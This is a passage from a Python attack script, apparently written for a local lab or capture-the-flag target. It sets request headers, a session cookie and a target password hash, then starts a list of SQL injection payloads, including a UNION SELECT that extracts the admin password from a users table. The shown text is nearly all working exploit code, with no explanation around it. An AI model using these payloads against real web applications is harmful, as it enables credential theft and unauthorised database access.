    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Attempt 1: Check if we can extract password using UNION")
print("="*60)

# Try to extract password field using UNION
union_extraction = [
    # Try different column counts
    ("' UNION SELECT password FROM users WHERE username='admin'-- ", "test"),
